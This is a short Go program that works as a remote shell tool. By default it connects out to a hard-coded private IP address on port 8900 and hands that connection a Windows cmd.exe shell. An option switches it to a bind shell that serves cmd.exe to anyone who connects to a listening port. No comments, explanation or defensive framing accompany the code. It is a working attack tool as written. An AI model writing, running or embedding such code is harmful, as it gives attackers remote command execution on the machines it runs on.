package main
import (
        "io"
        "log"
        "net"
        "os/exec"
        "flag"
	"strings"
)
var (
        p,l,t,x string
)
func handle(conn net.Conn) {
        cmd := exec.Command(x)
        rp, wp := io.Pipe()
        cmd.Stdin = conn
        cmd.Stdout = wp
        go io.Copy(conn, rp)
        cmd.Run()
        conn.Close()
}
func wait() {
        socket := ":" + p
        listener, err := net.Listen("tcp", socket)
        if err != nil {
                log.Fatalln(err)
        }
        for {
                conn, err := listener.Accept()
                if err != nil {
                        log.Fatalln(err)
                }
                go handle(conn)
        }
}
func call() {
        host := l + ":" + p

        c,_:=net.Dial("tcp",host);
        cmd:=exec.Command(x);
        cmd.Stdin=c;
        cmd.Stdout=c;
        cmd.Stderr=c;
        cmd.Run()
}
func main() {
        flag.StringVar(&l, "l", "192.168.8.178", "hey listen host")
        flag.StringVar(&x, "x", "cmd.exe", "cmd to x")
        flag.StringVar(&p, "p", "8900", "listening port")
        flag.StringVar(&t, "t", "rev", "type of shell bind 0r rev")
	flag.Parse()

	switch {
	case strings.Contains(t, "bind"):
		wait()
	default:
		call()
	}
}

